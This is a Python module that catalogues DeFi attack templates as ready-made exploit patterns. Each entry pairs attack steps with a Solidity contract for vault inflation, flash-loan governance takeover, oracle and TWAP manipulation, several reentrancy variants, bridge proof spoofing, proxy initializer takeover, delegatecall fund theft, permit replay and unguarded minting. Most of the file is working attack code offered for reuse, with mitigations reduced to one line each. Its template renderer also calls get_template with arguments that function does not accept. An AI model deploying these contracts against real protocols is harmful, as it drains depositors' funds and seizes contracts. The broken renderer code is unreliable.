"""Attack templates — ready-made exploit patterns for common DeFi protocols"""

from typing import Dict

TEMPLATES = {
    "inflation_attack": {
        "type": "vault",
        "severity": "HIGH",
        "title": "First Deposit Inflation Attack",
        "description": "Share calculation uses balance directly, allowing attacker to inflate via donation",
        "contracts": ["ERC-4626 Vault", "sDAI", "sUSDS"],
        "steps": [
            "1. Attacker deposits 1 wei (first depositor)",
            "2. Attacker donates large amount directly to vault",
            "3. Victim deposits — gets near-0 shares due to inflated totalAssets",
            "4. Attacker withdraws — gets back donation + victim's deposit",
        ],
        "mitigation": "Use virtual shares (ERC-4626) or minimum deposit",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit(uint256 assets, address receiver) external payable returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external payable returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

contract InflationAttack {
    IVault public vault;
    address public owner;
    
    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }
    
    function attack() external payable {
        // Step 1: Deposit 1 wei
        vault.deposit{value: 1}(1, address(this));
        
        // Step 2: Donate to inflate
        (bool ok,) = address(vault).call{value: msg.value - 1}("");
        require(ok);
    }
    
    function withdraw() external {
        uint256 shares = vault.balanceOf(address(this));
        vault.withdraw(type(uint256).max, owner, address(this));
    }
    
    receive() external payable {}
}
''',
    },
    "admin_ssr_manipulation": {
        "type": "vault",
        "severity": "CRITICAL",
        "title": "Admin SSR Manipulation",
        "description": "Admin can set arbitrary savings rate, draining all yield",
        "contracts": ["sUSDS", "DSR Pot"],
        "steps": [
            "1. Admin key is compromised",
            "2. Call file('ssr', 1000000 * 1e27) — set 1M% rate",
            "3. Call drip() — all value flows to vow (attacker)",
            "4. Repeat to drain entire vault",
        ],
        "mitigation": "Add 48h timelock to file() function",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ISUSDS {
    function file(bytes32 what, uint256 data) external;
    function drip() external returns (uint256);
    function wards(address) external view returns (uint256);
}

contract AdminAttack {
    ISUSDS public sUSDS;
    
    constructor(address _sUSDS) {
        sUSDS = ISUSDS(_sUSDS);
    }
    
    // Only works if caller is admin
    function attack() external {
        // Set SSR to extreme value
        sUSDS.file("ssr", 1000000 * 1e27);
        
        // Drain all yield
        sUSDS.drip();
    }
}
''',
    },
    "flash_loan_governance": {
        "type": "governance",
        "severity": "CRITICAL",
        "title": "Flash Loan Governance Attack",
        "description": "Borrow voting power via flash loan to pass malicious proposal",
        "contracts": ["GovernorBravo", "Compound Governance"],
        "steps": [
            "1. Create malicious proposal (e.g., upgrade to backdoored contract)",
            "2. Take flash loan for massive SKY/MKR tokens",
            "3. Delegate borrowed tokens to self",
            "4. Vote on proposal with borrowed voting power",
            "5. Execute proposal before loan is due",
            "6. Repay flash loan",
        ],
        "mitigation": "Use snapshot voting (time-weighted balances)",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IFlashLoan {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

interface IGovernor {
    function propose(address[] memory targets, uint256[] memory values, bytes[] memory calldatas, string memory description) external returns (uint256);
    function castVote(uint256 proposalId, bool support) external;
    function queue(uint256 proposalId) external;
    function execute(uint256 proposalId) external payable;
}

interface IToken {
    function delegate(address delegatee) external;
    function getVotes(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract GovernanceAttack {
    IFlashLoan public lender;
    IGovernor public governor;
    IToken public token;
    
    constructor(address _lender, address _governor, address _token) {
        lender = IFlashLoan(_lender);
        governor = IGovernor(_governor);
        token = IToken(_token);
    }
    
    function attack() external {
        // Step 1: Borrow voting power via flash loan
        lender.flashLoan(address(this), address(token), type(uint256).max, "");
    }
    
    function onFlashLoan(address token_, uint256 amount, bytes calldata data) external {
        // Step 2: Delegate to self
        IToken(token_).delegate(address(this));
        
        // Step 3: Create and vote on malicious proposal
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        
        targets[0] = address(this);  // Malicious target
        values[0] = 0;
        calldatas[0] = abi.encodeWithSignature("execute()");
        
        uint256 proposalId = governor.propose(targets, values, calldatas, "Malicious upgrade");
        
        // Step 4: Vote
        governor.castVote(proposalId, true);
        
        // Step 5: Queue and execute
        governor.queue(proposalId);
        governor.execute(proposalId);
        
        // Step 6: Repay flash loan
        IToken(token).transfer(msg.sender, amount);
    }
}
''',
    },
    "oracle_manipulation": {
        "type": "amm",
        "severity": "CRITICAL",
        "title": "Oracle Manipulation Attack",
        "description": "Manipulate spot price on DEX to break lending protocol oracle",
        "contracts": ["UniswapV2", "Aave", "Compound"],
        "steps": [
            "1. Identify lending protocol using spot price oracle",
            "2. Swap large amount on DEX to skew price",
            "3. Borrow against inflated collateral",
            "4. Price returns to normal — attacker keeps profit",
            "5. Liquidator loses funds (bad debt)",
        ],
        "mitigation": "Use Chainlink or TWAP oracles",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ILending {
    function updatePrice(uint256 newRateA, uint256 newRateB) external;
    function depositCollateral(address token, uint256 amount) external;
    function borrow(address debtToken, uint256 amount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @notice Oracle manipulation against a lending protocol that reads a
///         single writable price. Deposit collateral, inflate the price
///         (no access control), borrow far more than legitimately possible.
contract OracleAttack {
    ILending public lending;
    address public collateralToken;
    address public debtToken;

    constructor(address _lending, address _collateral, address _debt) {
        lending = ILending(_lending);
        collateralToken = _collateral;
        debtToken = _debt;
    }

    function attack() external {
        IERC20(collateralToken).approve(address(lending), type(uint256).max);
        lending.depositCollateral(collateralToken, 100 ether);
        // anyone can move the price -> 2x collateral value
        lending.updatePrice(2 ether, 1 ether);
        // borrow 100 debt — impossible at the honest 150% ratio
        lending.borrow(debtToken, 100 ether);
    }
}
''',
    },
    "reentrancy_attack": {
        "type": "lending",
        "severity": "CRITICAL",
        "title": "Reentrancy Attack",
        "description": "External call before state update allows recursive withdraw",
        "contracts": ["Vault", "Lending Pool"],
        "steps": [
            "1. Attacker deposits small amount",
            "2. Attacker calls withdraw()",
            "3. Vault sends ETH before updating balance",
            "4. Attacker's receive() calls withdraw() again",
            "5. Repeat until vault is drained",
        ],
        "mitigation": "Checks-Effects-Interactions pattern + ReentrancyGuard",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address) external view returns (uint256);
}

contract ReentrancyAttack {
    IVault public vault;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks;
    
    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }
    
    function attack() external payable {
        vault.deposit{value: msg.value}();
        maxAttacks = 10;
        attackCount = 0;
        vault.withdraw();
    }
    
    receive() external payable {
        attackCount++;
        if (attackCount < maxAttacks && address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
''',
    },
    "bridge_deposit_spoof": {
        "type": "bridge",
        "severity": "CRITICAL",
        "title": "Bridge Deposit Spoof / Unverified Mint",
        "description": "Bridge mints wrapped tokens based on a deposit proof lacking signature or oracle verification, letting attacker mint with a fake deposit",
        "contracts": ["Wormhole", "Axie Ronin Bridge", "Nomad Bridge"],
        "steps": [
            "1. Find the bridge's mint/finalize function on the destination chain",
            "2. Inspect the deposit proof — if it only checks msg.sender or a forgeable hash, attacker can spoof",
            "3. Call finalizeDeposit() with a forged origin tx hash / calldata",
            "4. Bridge mints wrapped tokens to attacker with zero locked collateral",
            "5. Swap wrapped tokens for real assets and exit",
        ],
        "mitigation": "Cryptographically verify origin-chain events with quorum signatures; validate proof structure; rate-limit withdrawals",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IBridge {
    function finalizeDeposit(bytes calldata proof) external returns (uint256);
    function mint(address to, uint256 amount) external;
    function isValidProof(bytes calldata proof) external view returns (bool);
}

contract BridgeSpoof {
    IBridge public bridge;

    constructor(address _bridge) {
        bridge = IBridge(_bridge);
    }

    // Crafts a 'proof' that passes a weak check (e.g., only a hash check)
    function attack(bytes calldata forgedProof) external {
        require(bridge.isValidProof(forgedProof), "proof rejected");
        uint256 minted = bridge.finalizeDeposit(forgedProof);
        // minted tokens are now under attacker control
    }

    // Some bridges expose mint() directly — should never be external
    function attackMint(address to, uint256 amount) external {
        bridge.mint(to, amount);
    }
}
''',
    },
    "sandwich_attack": {
        "type": "amm",
        "severity": "MEDIUM",
        "title": "Sandwich / MEV Attack",
        "description": "Attacker observes a pending swap, front-runs to move price, victim fills at a worse price, attacker back-runs to profit",
        "contracts": ["UniswapV2", "UniswapV3", "PancakeSwap"],
        "steps": [
            "1. Monitor mempool for large pending swaps",
            "2. Front-run: buy token before victim's swap (pushes price up)",
            "3. Victim swap executes at inflated price (high slippage)",
            "4. Back-run: sell token after victim's swap at profit",
        ],
        "mitigation": "Set low slippage tolerance, use private RPC (Flashbots), use TWAP-based pricing",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IPair {
    function getReserves() external view returns (uint256, uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to) external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @notice Sandwich a victim swap: front-run to move the price, let the
///         victim fill at the worse price, then back-run for the profit.
contract SandwichAttack {
    IPair public pair;
    IWETH public weth;
    IERC20 public token;

    constructor(address _pair, address _weth, address _token) {
        pair = IPair(_pair);
        weth = IWETH(_weth);
        token = IERC20(_token);
    }

    /// Front-run: buy `amountIn` WETH of token at the fair price.
    function frontRun(uint256 amountIn) external returns (uint256 tknOut) {
        weth.deposit{value: amountIn}();
        weth.transfer(address(pair), amountIn);
        (uint256 r0, uint256 r1) = pair.getReserves();
        tknOut = getAmountOut(amountIn, r0, r1);
        pair.swap(0, tknOut, address(this));
    }

    /// Back-run: sell `tknIn` token back for WETH at the inflated price.
    function backRun(uint256 tknIn) external returns (uint256 wethOut) {
        (uint256 r0, uint256 r1) = pair.getReserves();
        wethOut = getAmountOut(tknIn, r1, r0);
        token.approve(address(pair), tknIn);
        token.transfer(address(pair), tknIn);
        pair.swap(wethOut * 95 / 100, 0, address(this));
        return weth.balanceOf(address(this));
    }

    // UniswapV2 getAmountOut (0.3% fee)
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}
''',
    },
    "twap_manipulation": {
        "type": "amm",
        "severity": "CRITICAL",
        "title": "TWAP Oracle Manipulation (Short Window)",
        "description": "TWAP oracles with a short observation window can be moved with a flash loan, breaking lending/bridging protocols that trust them",
        "contracts": ["UniswapV2 TWAP", "PancakeSwap", "GMX/GLP", "Kyber"],
        "steps": [
            "1. Identify protocol using TWAP with a short period (e.g., 30s-1hr)",
            "2. Flash-borrow huge amount, swap to move average price past the oracle threshold",
            "3. Trigger oracle-dependent action (borrow, mint, liquidate) at the distorted price",
            "4. Repay flash loan and let price mean-revert",
        ],
        "mitigation": "Lengthen TWAP window, require multiple sources, use Chainlink with deviation checks",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ITwap {
    function sync() external;
    function swap1To0(uint256 amountIn) external;
    function consult(address token, uint256 amountIn) external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @notice TWAP oracle manipulation: one large swap (flash-borrowed capital)
///         dominates the short observation window and moves the TWAP.
contract TwapAttack {
    ITwap public pool;
    IERC20 public token1;

    constructor(address _pool, address _token1) {
        pool = ITwap(_pool);
        token1 = IERC20(_token1);
    }

    function attack(uint256 amountIn) external {
        token1.approve(address(pool), amountIn);
        pool.swap1To0(amountIn);
    }
}
''',
    },
    "flash_loan_reentrancy": {
        "type": "lending",
        "severity": "CRITICAL",
        "title": "Flash Loan + Reentrancy Combo",
        "description": "Flash loan provides the capital, reentrancy on a non-protected withdraw drains the lending pool before state updates",
        "contracts": ["Vault", "Lending Pool", "dForce", "Cream Finance"],
        "steps": [
            "1. Flash-borrow a large amount from a supported lender",
            "2. Deposit into the vulnerable pool",
            "3. Trigger withdraw() that calls back (e.g., ERC777 token hook) before updating balances",
            "4. Re-enter repeatedly to drain the pool",
            "5. Repay the flash loan, keep the profit",
        ],
        "mitigation": "ReentrancyGuard on all state-changing external calls; CEI pattern; no external calls before state updates",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IPool {
    function deposit(address token, uint256 amount) external;
    function withdraw(address token, uint256 amount) external;
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract FlashLoanReentrancy {
    IPool public pool;
    IERC20 public token;
    uint256 public attackCount;
    uint256 public maxAttacks;
    bool public armed;
    uint256 public drainAmount;

    constructor(address _pool, address _token) {
        pool = IPool(_pool);
        token = IERC20(_token);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(address(this), address(token), amount, "");
    }

    function onFlashLoan(address _token, uint256 amount, bytes calldata) external {
        token.approve(address(pool), amount);
        pool.deposit(address(token), amount);

        armed = true;
        drainAmount = amount;
        attackCount = 0;
        maxAttacks = 4;
        pool.withdraw(address(token), amount); // re-enters via token transfer hook

        armed = false;
        token.transfer(msg.sender, amount); // repay flash loan
    }

    // ERC777-style hook fired on every direct token transfer to this contract.
    // The vulnerable pool sends tokens BEFORE updating balances, so we re-enter
    // withdraw() and drain the remaining liquidity while the balance is stale.
    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external {
        if (armed && attackCount < maxAttacks) {
            attackCount++;
            pool.withdraw(address(token), drainAmount);
        }
    }
}
''',
    },
    "withdraw_frontrun": {
        "type": "vault",
        "severity": "MEDIUM",
        "title": "Vault Withdraw Front-Running (Share Price Manipulation)",
        "description": "Attacker front-runs a large victim withdrawal to capture rounding or move share price, causing victim loss",
        "contracts": ["ERC-4626 Vault", "Yearn", "sDAI/sUSDS"],
        "steps": [
            "1. Watch mempool for large vault.withdraw() or redeem()",
            "2. Front-run: deposit/redeem to move share price (rounding direction)",
            "3. Victim's redeem executes at a worse rate",
            "4. Back-run: exit at profit",
        ],
        "mitigation": "Use virtual shares/offset (ERC-4626), enforce minimum deposit/withdraw amounts, commit-reveal for large exits",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault4626 {
    function deposit(uint256 assets, address receiver) external payable returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

/// @notice Vault withdraw front-running: deposit right before a victim's
///         redemption to move the share price / capture rounding, then exit.
contract WithdrawFrontRun {
    IVault4626 public vault;

    constructor(address _vault) {
        vault = IVault4626(_vault);
    }

    function frontRunDeposit(uint256 assets) external payable returns (uint256 shares) {
        shares = vault.deposit{value: assets}(assets, address(this));
    }

    function backRunRedeem(uint256 shares) external returns (uint256 assets) {
        assets = vault.redeem(shares, address(this), address(this));
    }
}
''',
    },
    "proxy_initialization": {
        "type": "vault",
        "severity": "CRITICAL",
        "title": "Unprotected Initializer (Upgradeable Proxy Takeover)",
        "description": "Upgradeable contract deployed with an unguarded initialize() — attacker calls it first to become owner/implementation",
        "contracts": ["OpenZeppelin UUPS", "Transparent Proxy", "Diamond"],
        "steps": [
            "1. Scan for upgradeable contracts (EIP-1967 storage slots / delegatecall proxies)",
            "2. Check whether initialize() was already called on the implementation",
            "3. If not, call initialize() to become owner",
            "4. Upgrade the implementation to a malicious contract or steal funds",
        ],
        "mitigation": "Guard initialize() with an initializer modifier; call it atomically in the deployment tx; verify implementations are initialized",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IUUPS {
    function initialize(address owner) external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function owner() external view returns (address);
}

contract ProxyTakeover {
    IUUPS public proxy;

    constructor(address _proxy) {
        proxy = IUUPS(_proxy);
    }

    // Step 1: if initialize() was never called, attacker claims ownership
    function claimOwnership() external {
        proxy.initialize(address(this));
        require(proxy.owner() == address(this), "already initialized");
    }

    // Step 2: upgrade to a malicious implementation
    function upgrade(address maliciousImpl) external {
        require(proxy.owner() == address(this), "not owner");
        proxy.upgradeToAndCall(maliciousImpl, "");
    }
}
''',
    },
    "permit_replay": {
        "type": "token",
        "severity": "HIGH",
        "title": "EIP-2612 Permit Replay (Cross-Chain Signature Reuse)",
        "description": "Token's EIP-712 domain separator omits chainId, so a valid permit signature is replayed on another chain where the same address controls tokens",
        "contracts": ["EIP-2612 Tokens", "Bridges", "Aave (2021 incident)"],
        "steps": [
            "1. Obtain a victim's valid permit signature (from a known chain)",
            "2. Confirm the token uses a domain separator without chainId",
            "3. Replay the same signature on the target chain",
            "4. Spend the victim's allowance on the target chain",
        ],
        "mitigation": "Include chainId in the EIP-712 domain separator; verify chainId inside permit",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Victim signed this message on chain A:
// permit(owner, spender, value, deadline, v, r, s)
interface IERC20Permit {
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract PermitReplay {
    function replay(
        IERC20Permit token,
        address victim,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // Replay the signature captured from another chain.
        // If the domain separator lacks chainId, this succeeds.
        token.permit(victim, address(this), value, deadline, v, r, s);
        token.transferFrom(victim, address(this), value);
    }
}
''',
    },
    "liquidation_sandwich": {
        "type": "lending",
        "severity": "HIGH",
        "title": "Liquidation Race / Sandwich",
        "description": "Attacker monitors health-factor drops and front-runs liquidations to capture the bonus, or liquidates with zero bad debt when the protocol misses price updates",
        "contracts": ["Aave", "Compound", "Maker Vault"],
        "steps": [
            "1. Watch for undercollateralized positions",
            "2. Front-run the liquidation tx with a swap that drops collateral price further",
            "3. Call liquidate() to claim the liquidation bonus",
            "4. Swap the seized collateral back at profit",
        ],
        "mitigation": "Dutch-auction style liquidations, MEV-resistant order flow, oracle price guardrails",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ILiquidator {
    function liquidate(address borrower, uint256 repayAmount, address collateralAsset, address debtAsset) external;
    function getAccountHealth(address account) external view returns (uint256);
}

contract LiquidationSandwich {
    ILiquidator public lending;

    constructor(address _lending) {
        lending = ILiquidator(_lending);
    }

    // In practice: swap to push collateral price down first (lowering health factor)
    function isLiquidatable(address borrower) internal view returns (bool) {
        return lending.getAccountHealth(borrower) < 1e18;
    }

    function liquidate(address borrower, address collateralAsset, address debtAsset, uint256 amount) external {
        // Execute liquidation to claim the bonus
        require(isLiquidatable(borrower), "not liquidatable");
        lending.liquidate(borrower, amount, collateralAsset, debtAsset);
    }
}
''',
    },
    "force_send_break": {
        "type": "vault",
        "severity": "MEDIUM",
        "title": "Forced ETH Send Breaks Share Accounting",
        "description": "Selfdestruct or coinbase reward force-sends ETH into a vault that computes share price from balanceOf, inflating price and breaking accounting",
        "contracts": ["ERC-4626 Vaults", "WETH-style contracts", "Savings contracts"],
        "steps": [
            "1. Deploy a contract with selfdestruct(to = vault)",
            "2. Fund it with ETH and call selfdestruct to force-send ETH to the vault",
            "3. Vault balance rises without minted shares — share price inflates",
            "4. Victim deposits later and receives fewer shares; attacker redeems at the inflated price",
        ],
        "mitigation": "Track internal accounting (totalAssets via an internal counter), never trust balanceOf(address(this))",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function balanceOf(address) external view returns (uint256);
    function totalAssets() external view returns (uint256);
}

contract ForceSender {
    // Force-send ETH to the vault — bypasses receive() guards
    function forceSend(address target) external payable {
        selfdestruct(payable(target));
    }
}

contract ForceSendBreak {
    IVault public vault;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    // After the force-send, share price is inflated
    function exploit() external view returns (uint256 inflatedPrice) {
        return vault.totalAssets() * 1e18 / (vault.balanceOf(address(this)) + 1);
    }
}
''',
    },
    "stablecoin_peg_collateral_swap": {
        "type": "stablecoin",
        "severity": "HIGH",
        "title": "Stablecoin Collateral Swap / Peg Attack",
        "description": "If a stablecoin allows swapping collateral types via a manipulated price feed, attacker converts cheap collateral into expensive collateral and mints",
        "contracts": ["Maker Vault", "Frax", "Synthetic stablecoins"],
        "steps": [
            "1. Open a vault / collateralized position",
            "2. Manipulate the collateral price feed (see twap_manipulation)",
            "3. Swap expensive collateral for cheap collateral at the distorted price",
            "4. Withdraw the expensive collateral or mint more stablecoin than backed",
        ],
        "mitigation": "Use robust multi-source oracles, collateral-swap price caps, debt ceilings",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IStable {
    function openVault() external returns (uint256);
    function depositCollateral(uint256 vaultId, address collateral, uint256 amount) external;
    function updatePrice(uint256 newRateA, uint256 newRateB) external;
    function mint(uint256 vaultId, uint256 amount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @notice Stablecoin minted against manipulable collateral: open a vault
///         backed by cheap collateral, inflate its price (no access
///         control), mint more stablecoin than the deposit backs.
contract PegCollateralSwap {
    IStable public mstable;
    address public stable;
    address public collateral;

    constructor(address _mstable, address _stable, address _collateral) {
        mstable = IStable(_mstable);
        stable = _stable;
        collateral = _collateral;
    }

    function attack() external returns (uint256 minted) {
        uint256 id = mstable.openVault();
        IERC20(collateral).approve(address(mstable), type(uint256).max);
        mstable.depositCollateral(id, collateral, 1000 ether);
        // inflate collateralB price 2x (no access control)
        mstable.updatePrice(1 ether, 2 ether);
        // mint 1300 stable at 66% LTV of the inflated 2000 value
        mstable.mint(id, 1300 ether);
        minted = 1300 ether;
    }
}
''',
    },
    "cross_function_reentrancy": {
        "type": "vault",
        "severity": "CRITICAL",
        "title": "Cross-Function Reentrancy",
        "description": "withdrawBalance() sends ETH before zeroing the balance; the attacker re-enters transferBalance() from the receive() hook to double-credit funds",
        "contracts": ["Vault", "Lending Pool", "Exchange"],
        "steps": [
            "1. Attacker deposits a small amount into the vulnerable vault",
            "2. Attacker calls withdrawBalance() — vault sends ETH BEFORE zeroing the balance",
            "3. The send triggers attacker's receive() while their balance is still intact",
            "4. receive() calls transferBalance(benefactor, balance) — moves the still-counted balance to a second attacker account",
            "5. withdrawBalance() resumes and zeroes the original balance",
            "6. Net: attacker received the withdrawal AND the beneficiary holds the transferred funds — value created from thin air, draining other users' backing",
        ],
        "mitigation": "Checks-Effects-Interactions in every function, ReentrancyGuard, or transfer balance via pull pattern",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function transferBalance(address to, uint256 amount) external;
    function withdrawBalance() external;
}

contract CrossFunctionReentrancyAttack {
    IVault public vault;
    address public owner;
    address public benefactor;
    bool public reentered;

    constructor(address _vault, address _benefactor) {
        vault = IVault(_vault);
        benefactor = _benefactor;
        owner = msg.sender;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawBalance();
    }

    receive() external payable {
        // Balance is still credited here — move it to a second account
        if (!reentered) {
            reentered = true;
            vault.transferBalance(benefactor, address(this).balance);
        }
    }
}
''',
    },
    "arbitrary_delegatecall": {
        "type": "proxy",
        "severity": "CRITICAL",
        "title": "Arbitrary Delegatecall via Unauthenticated Proxy Upgrade",
        "description": "Proxy exposes setImplementation() with no access control; attacker points the delegatecall at their own contract and runs code in the proxy's storage/ETH context",
        "contracts": ["Proxy", "Router", "Upgradeable Contract"],
        "steps": [
            "1. Find a proxy whose fallback delegatecalls implementation (msg.data) with no auth on the upgrade function",
            "2. Call setImplementation(attackerImpl) to redirect the proxy",
            "3. Call proxy.steal() — fallback delegatecalls attackerImpl.steal(), executed in the proxy's context",
            "4. attackerImpl reads address(this).balance (the proxy's ETH) and sends it to the attacker",
            "5. Proxy drained; storage can also be overwritten via layout collision",
        ],
        "mitigation": "Restrict setImplementation to an owner/governance with timelock; validate implementation contract; use ERC-1967 slots",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IProxy {
    function setImplementation(address impl) external;
    function implementation() external view returns (address);
}

contract HackImpl {
    // Runs in the PROXY's context via delegatecall: address(this) is the proxy
    function steal() external {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "steal failed");
    }

    function takeOver() external {
        assembly {
            sstore(0, caller()) // overwrite proxy slot 0 (e.g. owner)
        }
    }
}

contract DelegatecallAttack {
    function attack(address proxy, address hackImpl) external {
        IProxy(proxy).setImplementation(hackImpl);
        (bool ok, ) = proxy.call(abi.encodeWithSignature("steal()"));
        require(ok, "delegatecall failed");
    }

    receive() external payable {} // receives the swept proxy ETH
}
''',
    },
    "permissionless_mint": {
        "type": "token",
        "severity": "HIGH",
        "title": "Permissionless Mint (Missing Access Control)",
        "description": "Token's mint() has no onlyOwner/role check, so any address can mint unlimited supply and dump it on the market",
        "contracts": ["ERC-20 Token", "Yield Token", "Reward Token"],
        "steps": [
            "1. Inspect the token for a public mint() without a minter/owner modifier",
            "2. Call mint(attacker, 1_000_000 ether)",
            "3. Total supply inflates, existing holders are diluted",
            "4. Attacker swaps the minted supply for real assets",
        ],
        "mitigation": "Restrict mint to an owner/minter role; add hard supply cap; monitor supply growth events",
        "code": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IToken {
    function mint(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract PermissionlessMintAttack {
    function attack(address token, uint256 amount) external returns (uint256 minted) {
        IToken(token).mint(msg.sender, amount);
        return IToken(token).balanceOf(msg.sender);
    }
}
''',
    },
}

def list_templates(type_filter: str = "all") -> Dict:
    """List available templates"""
    if type_filter == "all":
        return TEMPLATES
    return {k: v for k, v in TEMPLATES.items() if v.get("type") == type_filter}

def get_template(name: str) -> Dict:
    """Get a specific template"""
    return TEMPLATES.get(name, {})

def render_template(name: str, **kwargs) -> str:
    """Render a template with custom parameters"""
    template = get_template(name, **kwargs)
    if not template:
        return ''
    
    code = template.get('code', '')
    for key, val in kwargs.items():
        code = code.replace(f'{{{{{key}}}}}', str(val))
    
    return code
